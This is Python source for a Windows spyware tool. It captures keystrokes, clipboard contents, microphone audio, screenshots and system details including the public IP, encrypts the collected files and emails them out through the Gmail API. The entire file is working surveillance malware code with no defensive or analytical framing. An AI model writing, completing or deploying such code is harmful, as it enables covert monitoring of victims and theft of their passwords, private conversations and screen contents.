# Libraries

# For creating and encoding email content
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import base64

# To collect computer info
import socket
import platform

# For clipboard access on Windows
import win32clipboard

# For capturing keystrokes
from pynput.keyboard import Key, Listener

# To interact with the OS
import os

# For microphone recording
from scipy.io.wavfile import write
import sounddevice as sd

# To encrypt the files
from encryption_util import generate_key, encrypt_file

# To get public IP and other information
from requests import get

# For taking screenshots
from PIL import ImageGrab

# Required for Gmail OAuth 2.0 authentication
from google.oauth2.credentials import Credentials
from google_auth_oauthlib.flow import InstalledAppFlow
from googleapiclient.discovery import build
from google.auth.transport.requests import Request

# For running tasks in parallel using threads
import threading
# -----------------------------------------

# Log file paths and settings

# File to store keylogs
keys_information = "key_log.txt"

# File to store system info
system_information = "systeminfo.txt"

# File to store clipboard data
clipboard_information = "clipboard.txt"

# File to store microphone recording
audio_information = "audio.wav"

# Duration for microphone recording (seconds)
microphone_time = 10

# File to store screenshots
screenshot_information = "screenshot.png"

# Path to encryption key file
key_file_path = "encryption_key.key"

# Email address to send logs
email_address = "sender email"

# Email recipient address
toaddr = "receiver email"

# Base path for log files
file_path = "C:\\your\\file\\path\\here\\..."

# File path extension (used for Windows file paths)
extend = "\\"

# Complete file path
file_merge = file_path + extend

# Gmail API scope for sending emails
SCOPES = ['https://www.googleapis.com/auth/gmail.send']
# ---------------------------------

# Functions and key generation

# Clears the contents of the txt files at the start of each session
for file in [keys_information, system_information, clipboard_information]:
    with open(file_merge + file, "w") as fi:
        fi.write("") # This clears the contents of the file

# ---------------------------------------------

# Generate or load the encryption key
encryption_key = generate_key(key_file_path)

# ---------------------------------

# Function to send an email with multiple file attachments
def send_email(filenames, attachments, toaddr):

    creds = None

    # Check if token.json exists (stores access and refresh tokens)
    if os.path.exists('token.json'):
        creds = Credentials.from_authorized_user_file('token.json', SCOPES)

    # If no valid credentials, initiate OAuth 2.0 login flow
    if not creds or not creds.valid:
        if creds and creds.expired and creds.refresh_token:
            creds.refresh(Request())
        else:
            flow = InstalledAppFlow.from_client_secrets_file('credentials.json', SCOPES)
            creds = flow.run_local_server(port=0)

        # Save the new credentials to token.json for future use
        with open('token.json', 'w') as token:
            token.write(creds.to_json())

    # Build Gmail API service to send email
    service = build('gmail', 'v1', credentials=creds)

    # Create an email message with attachments
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log Files"
    body = "Attached are the log files."
    msg.attach(MIMEText(body, 'plain'))

    # Attach each file to the email
    for filename, attachment in zip(filenames, attachments):
        with open(attachment, 'rb') as f:
            p = MIMEBase('application', 'octet-stream')
            p.set_payload(f.read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', f'attachment; filename={filename}')
            msg.attach(p)

    # Encode the message in base64 format
    raw_message = {'raw': base64.urlsafe_b64encode(msg.as_bytes()).decode()}

    # Send the email via Gmail API
    try:
        sent_msg = (service.users().messages().send(userId=fromaddr, body=raw_message).execute())
        print(f"Message Id: {sent_msg['id']}")
    except Exception as error:
        print(f"An error occurred: {error}")

# ---------------------------------------------------

# Function to gather and log system information
def computer_information():
    with open(file_merge + system_information, "a") as f:
        # Get local hostname
        hostname = socket.gethostname()
        # Get local IP address
        ipAddr = socket.gethostbyname(hostname)
        try:
            # Get public IP address
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')
        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query)")

        # Write system information
        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + ipAddr + '\n')

computer_information()

# ---------------------------------

# Function to capture clipboard data and log it
def copy_clipboard():
    with open(file_merge + clipboard_information, "a") as f:
        try:
            # Access clipboard
            win32clipboard.OpenClipboard()
            # Get clipboard data
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could not be copied")

copy_clipboard()

# ------------------------------

# Function to record audio from the microphone
def microphone():
    # Common sampling frequency for audio recording
    fs = 44100

    # Duration of the recording
    seconds = microphone_time

    # Start recording audio from microphone
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    # Save the recording to a file
    write(file_merge + audio_information, fs, myrecording)

# ---------------------

# Start a separate thread for recording audio
# Prevents other functions from being blocked by microphone()
def start_mic_thread():
    mic_thread = threading.Thread(target=microphone)
    mic_thread.start()

start_mic_thread()

# ----------------------

# Function to take a screenshot and save it
def screenshot():
    # Capture screenshot
    im = ImageGrab.grab()
    # Save screenshot to file
    im.save(file_merge + screenshot_information)

screenshot()

# -----------------------------------------
# Key count
count = 0
# Empty list to collect pressed keys
keys = []

# --------------------------

# Function to handle keypress events
def on_press(key):
    global keys, count

    # Print key to console
    print(key)
    # Add key to list
    keys.append(key)
    # Increment key count
    count += 1

    if count >= 1:
        count = 0
        # Write key logs to file
        write_file(keys)
        keys = []

# --------------------------

# Function to write keystrokes to the log file
def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            # Remove quotation marks from key string
            k = str(key).replace("'", "")
            # If space key is pressed, add a space
            if k.find("space") > 0:
                f.write(' ')
                f.close()
            # If enter key is pressed, add a newline
            if k.find("enter") > 0:
                f.write('\n')
                f.close()
            # Ignore special keys (e.g., Shift, Ctrl)
            elif k.find("Key") == -1:
                f.write(k)
                f.close()

# --------------------------

# Function to handle key release events
def on_release(key):
    if key == Key.esc:
        # Once 'esc' is pressed, log files are encrypted and email is sent
        files_to_encrypt = [keys_information,
                     system_information,
                     clipboard_information,
                     screenshot_information,
                     audio_information]

        for files in files_to_encrypt:
            try:
                # Encrypt each log file
                encrypt_file(file_merge + files, encryption_key) # Encrypting Files
            except Exception as e:
                print(f"Error encrypting {file_merge+files}: {e}")

        # Prepare attachments and send email
        attachments = [file_merge + files for files in files_to_encrypt]
        send_email(files_to_encrypt, attachments, toaddr)
        # Stop listener when 'esc' is pressed
        return False

# Set up the key listener to capture keystrokes
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
